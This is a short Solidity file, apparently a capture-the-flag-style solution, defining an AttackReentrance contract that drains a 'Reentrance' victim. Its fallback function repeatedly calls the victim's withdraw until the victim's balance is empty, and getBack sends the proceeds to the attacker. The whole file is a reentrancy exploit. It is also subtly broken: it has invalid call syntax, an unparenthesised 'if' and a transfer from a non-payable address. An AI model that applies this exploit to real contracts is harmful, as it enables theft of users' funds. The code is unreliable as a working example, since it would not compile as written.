// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Task.sol';

contract AttackReentrance {

    Reentrance victim;
    address owner;
    
    constructor(address _victim) {
        victim = Reentrance(_victim);
        owner = msg.sender;
    }

    function donate() public payable {
        (bool sent, bytes memory data) = victim.call{value: msg.value}("");
    }

    function getBack() public {
        require(owner == msg.sender);
        owner.transfer(address(this).balance);
    }

    fallback() external payable {
        if address(victim).balance > 0 {
            victim.withdraw(0.001 ether);
        }
    }

}